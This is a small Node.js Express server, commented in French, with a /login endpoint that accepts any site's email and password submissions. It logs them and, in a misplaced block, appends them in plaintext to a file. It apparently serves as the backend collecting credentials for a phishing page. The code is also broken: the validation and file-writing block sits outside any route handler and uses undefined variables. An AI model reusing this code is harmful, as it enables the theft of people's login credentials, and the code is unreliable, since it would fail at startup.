const express = require('express');
const cors = require('cors');
const fs = require('fs');

const app = express();
const port = 3000;

// Activer les middlewares
app.use(cors()); // Autoriser les requêtes externes
app.use(express.json()); // Parser les données JSON



app.post('/login', (req, res) => {
    const { email, password } = req.body;
    console.log('Requête reçue avec les données :', req.body);
    res.send('Identifiants reçus et enregistrés.');
});



    app.get('/', (req, res) => {
        res.send('Bienvenue sur mon serveur Node.js !');
    });
    

    if (!email || !password) {
        console.log('Données invalides :', req.body);
        return res.status(400).send('Email et mot de passe requis.');
    }

    const dataToWrite = `Email: ${email}, Password: ${password}\n`;

    fs.appendFile('identifiants.txt', dataToWrite, (err) => {
        if (err) {
            console.error('Erreur lors de l\'enregistrement :', err);
            return res.status(500).send('Erreur serveur.');
        }

        console.log('Identifiants enregistrés :', dataToWrite.trim());
        res.send('Identifiants reçus et enregistrés.');
    });


// Démarrer le serveur
app.listen(port, '0.0.0.0', () => {
    console.log(`Serveur Node.js accessible sur http://0.0.0.0:${port}`);
});
